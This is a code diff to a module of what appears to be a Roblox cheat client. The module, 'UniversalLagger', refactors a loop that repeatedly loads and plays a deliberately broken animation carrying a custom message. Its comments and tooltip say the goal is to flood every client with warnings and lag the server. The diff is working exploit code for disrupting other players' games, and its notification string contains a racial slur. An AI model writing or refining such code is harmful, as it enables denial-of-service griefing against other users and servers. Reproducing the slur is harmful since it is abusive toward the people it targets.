@@ -7,28 +7,29 @@ UniversalLagger = vape.Categories.World:CreateModule({
 	Name = 'UniversalLagger',
 	Function = function(callback)
 		if callback then
-			local random = Random.new()
-
             notif('UniversalLagger', 'yo nigga lets see their reaction !1!1!11!', 5)
-			repeat
-				local character = lplr.Character
-				local animator = character and character:FindFirstChildWhichIsA('Animator', true) or nil
 
-				if animator then
-					local text = Message.Value or ''
-					if text == '' then
-						text = DEFAULT_MESSAGE
-					end
+			local character = lplr.Character
+			local animator = character and character:FindFirstChildWhichIsA('Animator', true) or nil
 
-					-- both the preset and custom messages get the same padding
-					local animation = Instance.new('Animation')
-					animation.AnimationId = 'http=507770677\1'..random:NextInteger(1, 1000000)..'\n \n'..text..'\n \n'
-					local loaded = animator:LoadAnimation(animation)
-					loaded:Play(0, 0.0001, 0)
+			if animator then
+				local random = Random.new()
+				local text = Message.Value or ''
+				if text == '' then
+					text = DEFAULT_MESSAGE
 				end
 
-				task.wait()
-			until not UniversalLagger.Enabled
+				-- build ONE broken anim, then spam it instead of making a new one each frame
+				local animation = Instance.new('Animation')
+				-- yk a broken anim can make roblox fucking warn every clients
+				animation.AnimationId = 'http=5077706747\1'..random:NextInteger(1, 1000000)..'\n \n'..text..'\n \n'
+
+				repeat
+					local loaded = animator:LoadAnimation(animation)
+					loaded:Play(0, 0.0001, 0)
+					task.wait()
+				until not UniversalLagger.Enabled
+			end
 		end
 	end,
 	Tooltip = 'lags ur server, thx v3rm'
